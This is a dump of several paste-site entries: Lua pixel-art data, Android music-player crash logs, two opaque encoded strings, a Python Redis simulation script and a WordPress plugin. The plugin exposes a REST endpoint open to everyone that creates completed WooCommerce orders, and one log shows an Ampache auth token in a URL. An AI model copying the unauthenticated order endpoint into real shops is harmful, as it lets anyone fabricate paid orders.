rH89h6kk,OP,MetaMettalix,Lua,Wednesday 14th of May 2025 10:49:39 AM CDT,"return {'8c8c8c8c8c8c8c7c87c7c8ccccccccccccc8cc8cc8cc8c8c8c8c8c8c8c8c8c8c8c8c88c8', 'c88c8c8c8c8c8c87c8c87c7ccccc8c8c87c8ccc8cc8c8cc8cc8c8c8c8c8c88c8c8878c88', '8c8c8c878c878c8c87c78c8cc8ccc7ccc6cc767c767c8c676cc8c676c8c8c888c6c67678', '6c688c6c8cc8c8c7c676cc7c7c76cccc7c8ccc6c76c8c7cc876c8cc8c8c6cc6787c8c8c8', '88c8c8c76767c67cc7c777ef7eff7e7ccccc7cccc7c676c8ccc76c8c8c78c876c88876c8', 'c8c6c88cc8c8c76c8c7cfffffffff77e76cc8c876c7cccc6768c7676c676c8c76cc678c8', '88c8c6cc78c8c87c7cffeffffefcfef77cc8ccccc8c88c8cccc8cc8c78cc8c68788c8678', 'c688c8c8c8c8c8c67e7ffffffffff7fef77c7676c8cc87c876c8c676c8c687c676c8c8c8', '8cc6c88c8c67cc87ffffefefcfeffcf7cfe7ccc7cc67c6c8c767c8cc8c8c8c8c8c876c8c', '88c88c6c8cc88cc7fefffcfefffeffef7ff778c67c8c78cc6c8c8c6c8c8c86c8768c8888', 'c88c6c88c8c8cc777ffefececeffcfcfefcfe7cc8c8c6c87c8c678c8c676c8c6cc88c6c8', '6c8c8c8c8c678ef77cf7ceccecececf7f7f7f7ccc6c7cc6c8cc8c8c8c8c8c8c888c678c8', 'c86c88c6c8c8c7fefccefc6161ceccffef7ef7cc8c8c8c8c6c8c6c676c88888c6c88c688', 'c8c8c8c88c8c6fffecccecec6c6cceceff7f7f7c8cc6c8c7c7c7c8c8c8ccc6c876c8c8c8', 'c886c88c6c8ccfccecece86eccecccceccfefe7cc7c77cfcf7ffcc8c86888c88c886888c', '8cc8c8c8c88ceffcccc6ec6ccc86e6cccef77ffef7ffeffeffef76c8ccc676c6c8c8c688', 'c68c6c8c8ccccceccccc616c666c6c6ecccfcf7ffeffffffffffec88888c88c886c8c8c8', 'ccc88c6c88cccffef6cec66c6ec6cc6e8e7efcfcffffeffefcff7cc6cc8c8c6c8c88c6c8', '618c88c8c6ccccfcec6c6e86cc8c6ce46ccce7effefcffffffefc6c886c86c88886c888c', 'c6c8c88c8c7cecccceccce16e6ccc8e6ceccecefcffffcfeffffcc8c8c8c88c6c8c88c88', 'c16c8c8c8ccc7cecc676cc6c6c66e0ec6cce6e6cfefefffffcffcc8c6c8c8c8c886c68c8', '6cecc68c88ccc77ecc76c16ece61c616e6cc8eeeffffeffeffefc6c8c88c68c6c8c8c688', 'c16c8c8c6cccefcce6eceece6166616c1ce616e7fcfcffffffffcc88c6c8c88c8c888c8c', '664ec88c88ccceccc6c6c616c61ec6666cc6eceffcffcfcfefcfcc6c8c86c8c688c6c888', 'c16cc6888c8c7cceeceeec6ece660161e6ce66cfcffcfcffffffec8c88c888c8c6c88c6c', '6161c860686c7ccec6c6ce6ece16e6c616c1cefcffefffcfefefcc8c8c8c6c8c88c6c888', 'c6ce6c08808ccc7ece616cc66c6ec616cc6ce7fcfffcfeffefffe86c8c6c88c6c8888c8c', '164c1e808686ccccc6eceece6ce616e6cececffefcfffcfffeef7c86c8c8c888c8cc6888', '6c6e6c6800808ccece6ec6e6e66ce81616ccccffcffcffcfeeffcc8c88c6c6c88678cc8c', '6461c1c88086867ccc0ecec6cecec6c6e8ececfcfcffeffffeefcc8c8c8c8c6c8c688688', '616c616e860808c7ecececcec7c7ec161c6ccfeffefffcfceffef6c8c888c8c88c8c8cc8', '861c618e888686cffc6c6e7c76ece6c6cecceffcffcfcfffecc77c6c6c8c876c86767688', '646616c16808868ccccecc6ee76ece616c61ccfefcffefffef7efc8cc8c68c8c8c8c8cc8', '616c168ecc06888ccccc6e76e76e6e6c16ccecfffcffcfcffe7fe8c6c8c8c88c88c888c8', 'c6c6ce46ce88688cfcce76e76e6ce8e8e8ecccfeffcfcffeffefc7c88c6c8c6c86c676c8', '616161618ec886cfefffccae66e6e61c616ceefcfeffecffefe7c8cc8c8c8c8c78c8c888', 'c6c6c6e46ce88867ffcfece7e7e6c6c6c6e4ccecffcfffeff77fe768c886c886c88c8cc8', '646161c61cce88cfcffff7e6e6e6e4e618e61cec6ccfcfcfef7f7cc76c7c8c8c6c8868c8', 'c6186c616eccc6cffefffe7ece86c6cc6c6c6c600687f7fcf7cfc77777c77777787c78c8', '6c61616c81ece7efffefffc6ece16e61616161880066cf7fcfe777fe77777777f7777777', 'ce8c6c616c1cecf7ffffcfcce68ccc6c616c6800080868cf77f7fc7f7fefefc7ef77f7f7', 'c6161c61c6eccefccfe7f76ccce6c61e6c64600808000667c7fe77fe7f7f77ff7fcfe777', 'c6c66466e4cecccfeff768c6c6c16c6c1668008000880806687f777f7ef77efc7ef77fcf', 'c1cec616c61ceef77778668ce6c6ec6680080008600806808686fe77f777f777f7777777', 'c6c616c616ce8ccfc6868086cc6160c0080060008080808080888777e7efcfefc7efefcf', 'cec6c6c6ce6cce7c880808800688008000080808060806080608668f7f77777e7f77fc77', 'cccec616c61cc7766088080808008008080080608006080608008868c77ef77fcc7c7efc', '88cc1661c6c6c80808068680808060060808080080800808680800686c7fc7c7fe77f777', '6c6ccec6ecc768680808808608080808060080300808080800808808086777efcf7efcfc', '88cccccc8e76806080808808808080808080008030806080860600008066c777c7fcfc77', '0686ccce77680808608680806806008008080800080808030808086080806877c7c7cfc7', '868768887703808080806808080880080606080806030808008008060808866fe7cfefc7', '08068686888080808808808680806803080800608080860080030030803088877f777c77', '08808083780068060886808086030080080080808086080808080800608080367fe7cfc7', '8606080873880680800808608808080680380300608080603000008080086880877fef7c', '08808683f800803088680880868060800600808030803080080806008030088667777c77', '803808687380868063088063086080680806808080680808006080806080808838fef7c7', '80808088f808036c668068080888030808060806808060080800030800803808667cfc77', '868088677368080ee6888086080808030868060806080800008080080800808880777efc', '08306887f806803eee66e6ec66666668066080308080603803080800308060808667f777', '8808387f7730886ee2eeaeee2eeee6e686e6680803080800000308080608030883887efc', '088086f7f78803e6ee6ee6eee6eee6eee66ee60808030080808006080300808083677777', '868688fff7668868e6c6e2ee2ee2e6e2886e668080808603006803080808080808377777', '080866f7f780868687e6c68e6ece66e60366e800806008080800800808030808683ffcf7', '888888fff7388308676e66808668ce66686e208030808008080808030080030880777ff7', '380367efff80880897cc686308836e8086c6800808308080308608080808080368a7feff', '868808ff7f68868087c6c68803888686ce680806008080308030806080808080888f7f7f', '883868afff80888899cc6c89898960866c80808080060808080308080306030808afffff', '868888fff7a88608986cc6cc8c898988e6686060803808680808083080808083888fffff', '803868eff7808808d98cc616ecec979c6c68030808030808808608060380306008a7ffff', '888088fff78868889988c6e6ec68d9d7e8808080808680803803068080680803888fffff', '8868367fff388968888c6cc6cc779988e6680806080038680808303080303806038b7fff', '683867ffff736889068ce6c6e6c8d97c6c680830803800808608086308086038086fffff', '880867fefff70889886c6ece8e8688e6e6c36083680883838308080860308008038bffff', 'c68807fff7f776c7897ec6e6c6e6e6c6ec680808038060808803030080803080368fffff', '803867feffffccc78878ec6eec6c6e6c6e6898368838868868680830308083676777ffff', '868807fffeffeccc79ce8e766ee6c6ee6ce79808068038083808608086368c6cce7777fc', '683866ffffffce6c77a766cecc6ce8e8e687d938038083080838868686cc6cce8eefe7c7', '7686887ffff7cccec7ce7e676e6e86c6c6c699808086080636867876cc6ce86ccc7c77fc', 'e77383effeffecccc777e7e6c7c67e6ececc7988388388880886cc7ecc6ccc67e7ef7f77', 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}"
GTQGc24s,2025-05-14T18:47:13.286148,powerampache,PHP,Wednesday 14th of May 2025 10:47:13 AM CDT,"1.00-68 (68) - DB: 82
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
6uCDLpsB,pastsegundario,imagemdel,PowerShell,Wednesday 14th of May 2025 09:54:34 AM CDT,4Xw73xZAN34E3bP0Lbhp0tToqNymBo5BH9buhqyUXTMla1Korla9wpdDFU2c6B2t2ZJb2wPzOIxaYTqQxLwwoooOWI7C9FBAB9d943102a2A6Cd5451921163D0277C3c4b7A0eb78df7Cc185EB7AFE79J8PE6ZEjHa
hdtjL6wm,Simulated redis data for publishing to a local redis,athaena,Python,Wednesday 14th of May 2025 09:52:41 AM CDT,"#!/usr/bin/env python3
""""""
Simulation script for activity prediction data.
Generates random tracking data and publishes it to a Redis channel.
""""""

import asyncio
import json
import random
import aioredis
import argparse
from typing import Dict, List, Any, Tuple

# Constants from your configuration
CLASS_NAMES = [
    ""standing"",
    ""sitting_down"",
    ""sitting"",
    ""lying"",
    ""standing_up"",
    ""falling"",
    ""bending"",
]

# Default Redis connection settings
REDIS_HOST = ""localhost""
REDIS_PORT = 6379
REDIS_CHANNEL = ""activity_stream""

# Default simulation settings
MAX_TRACK_ID = 4
PUBLISH_DELAY = 1.0  # seconds between publications


def generate_random_bbox() -> List[float]:
    """"""Generate a random bounding box with normalized coordinates [x1, y1, x2, y2].""""""
    # Generate x1, y1 coordinates (top-left)
    x1 = random.uniform(0.05, 0.8)
    y1 = random.uniform(0.05, 0.8)
    
    # Generate width and height (ensuring box stays within frame)
    width = random.uniform(0.1, min(0.3, 1.0 - x1))
    height = random.uniform(0.2, min(0.5, 1.0 - y1))
    
    # Calculate x2, y2 coordinates (bottom-right)
    x2 = x1 + width
    y2 = y1 + height
    
    return [x1, y1, x2, y2]


def generate_random_action() -> Tuple[str, float]:
    """"""Generate a random action with confidence score.""""""
    action = random.choice(CLASS_NAMES)
    confidence = random.uniform(0.6, 0.99)
    return action, confidence


def generate_random_tracking_data(num_tracks: int) -> Dict[str, Any]:
    """"""Generate random tracking data for a specified number of tracks.""""""
    tracking_data = {}
    
    # Randomly decide how many tracks to include in this frame (1 to num_tracks)
    active_tracks = random.randint(1, num_tracks)
    track_ids = random.sample(range(num_tracks), active_tracks)
    
    for track_id in track_ids:
        track_id_str = str(track_id)
        action, confidence = generate_random_action()
        
        tracking_data[track_id_str] = {
            ""track_id"": track_id_str,
            ""current_actions"": [[action, confidence]],
            ""last_bbox"": generate_random_bbox()
        }
    
    return {""tracking_data"": tracking_data}


async def publish_simulated_data(
    redis_host: str, 
    redis_port: int, 
    channel: str,
    max_track_id: int,
    delay: float,
    iterations: int = None
) -> None:
    """"""Publish simulated tracking data to a Redis channel.""""""
    # Connect to Redis
    redis = await aioredis.from_url(f""redis://{redis_host}:{redis_port}"")
    
    try:
        print(f""Connected to Redis at {redis_host}:{redis_port}"")
        print(f""Publishing to channel: {channel}"")
        print(f""Press Ctrl+C to stop"")
        
        count = 0
        while iterations is None or count < iterations:
            # Generate random tracking data
            data = generate_random_tracking_data(max_track_id + 1)
            
            # Convert to JSON and publish
            data_json = json.dumps(data)
            await redis.publish(channel, data_json)
            
            # Print info about what was published
            num_tracks = len(data[""tracking_data""])
            track_ids = "", "".join(data[""tracking_data""].keys())
            print(f""Published data with {num_tracks} tracks (IDs: {track_ids})"")
            
            count += 1
            await asyncio.sleep(delay)
            
    except KeyboardInterrupt:
        print(""\nStopping simulation..."")
    finally:
        # Close Redis connection
        await redis.close()
        print(""Redis connection closed"")


def main():
    """"""Main entry point for the script.""""""
    parser = argparse.ArgumentParser(description=""Simulate activity tracking data and publish to Redis"")
    parser.add_argument(""--host"", default=REDIS_HOST, help=f""Redis host (default: {REDIS_HOST})"")
    parser.add_argument(""--port"", type=int, default=REDIS_PORT, help=f""Redis port (default: {REDIS_PORT})"")
    parser.add_argument(""--channel"", default=REDIS_CHANNEL, help=f""Redis channel (default: {REDIS_CHANNEL})"")
    parser.add_argument(""--delay"", type=float, default=PUBLISH_DELAY, help=f""Delay between publications in seconds (default: {PUBLISH_DELAY})"")
    parser.add_argument(""--max-tracks"", type=int, default=MAX_TRACK_ID, help=f""Maximum number of tracks (default: {MAX_TRACK_ID})"")
    parser.add_argument(""--iterations"", type=int, help=""Number of publications (default: unlimited)"")
    
    args = parser.parse_args()
    
    try:
        asyncio.run(publish_simulated_data(
            redis_host=args.host,
            redis_port=args.port,
            channel=args.channel,
            max_track_id=args.max_tracks,
            delay=args.delay,
            iterations=args.iterations
        ))
    except Exception as e:
        print(f""Error: {e}"")
        return 1
    
    return 0


if __name__ == ""__main__"":
    exit(main())"
JtWVk6MX,2025-05-14T16:49:23.299389,powerampache,PHP,Wednesday 14th of May 2025 09:49:23 AM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":33},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":2608084553,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
7HjHWjt5,2025-05-14T16:49:22.718441,powerampache,PHP,Wednesday 14th of May 2025 09:49:23 AM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:836)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException
	at androidx.media3.datasource.DefaultHttpDataSource.skipFully(DefaultHttpDataSource.java:744)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:455)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2008. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":32},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":2608084137,""cause"":{""dataSpec"":{""absoluteStreamPosition"":4816213,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://colonelinux.org/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d423f3d1135e38e88eb5c9362bcefb99d\u0026type\u003dsong\u0026id\u003d3963"",""length"":2574986,""position"":4816213,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":32},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2008,""extras"":{""mMap"":{}},""timestampMs"":2608084137,""cause"":{""dataSpec"":{""absoluteStreamPosition"":4816213,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://colonelinux.org/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d423f3d1135e38e88eb5c9362bcefb99d\u0026type\u003dsong\u0026id\u003d3963"",""length"":2574986,""position"":4816213,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":744,""methodName"":""skipFully""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":455,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
r4Aw0LV0,Create WP order,swte,PHP,Wednesday 14th of May 2025 09:34:30 AM CDT,"<?php
/**
 * Plugin Name: Stripe Sync Order
 * Description: REST API endpoint for creating and completing WooCommerce orders via Stripe webhook or other external service.
 * Version: 1.0
 * Author: T+GM Consulting
 */

// Register custom REST endpoint
add_action('rest_api_init', function () {
    register_rest_route('stripe-sync/v1', '/create-order', [
        'methods'  => 'POST',
        'callback' => 'stripe_sync_create_order',
        'permission_callback' => '__return_true', // Biztonság: majd érdemes lehet hitelesítést tenni rá
    ]);
});

function stripe_sync_create_order(WP_REST_Request $request) {
    $product_id = 123; // ← IDE írd be a termék ID-ját
    $user_id = 0; // 0 ha guest user
    $quantity = 1;

    // Dummy billing address
    $address = [
        'first_name' => 'Stripe',
        'last_name'  => 'User',
        'email'      => 'stripe@example.com',
        'phone'      => '06301234567',
        'address_1'  => 'Stripe Street 1',
        'city'       => 'Budapest',
        'postcode'   => '1111',
        'country'    => 'HU',
    ];

    try {
        $order = wc_create_order(['customer_id' => $user_id]);
        $product = wc_get_product($product_id);
        if (!$product) {
            return new WP_Error('invalid_product', 'A megadott termék nem létezik', ['status' => 400]);
        }

        $order->add_product($product, $quantity);
        $order->set_address($address, 'billing');
        $order->calculate_totals();
        $order->update_status('completed', 'Rendelés automatikusan lezárva Stripe-ból.');

        return [
            'success' => true,
            'order_id' => $order->get_id(),
            'status' => $order->get_status(),
        ];

    } catch (Exception $e) {
        return new WP_Error('order_creation_failed', $e->getMessage(), ['status' => 500]);
    }
}
"
JjiwTBjN,testevai,imagemdel,PowerShell,Wednesday 14th of May 2025 09:27:06 AM CDT,4Xw73xZAN344zP2xgEwKxyQaFxcM8IFA2TZBIdI70UlJ220FuUPzGl36Tg4UQtPgMk2uj0To0swa7un502492d6eE67BEF55ce79d742120f3E0f0c0775E556B5B3bbAFaaBABCDA3F263A25J8PE6ZEjHa
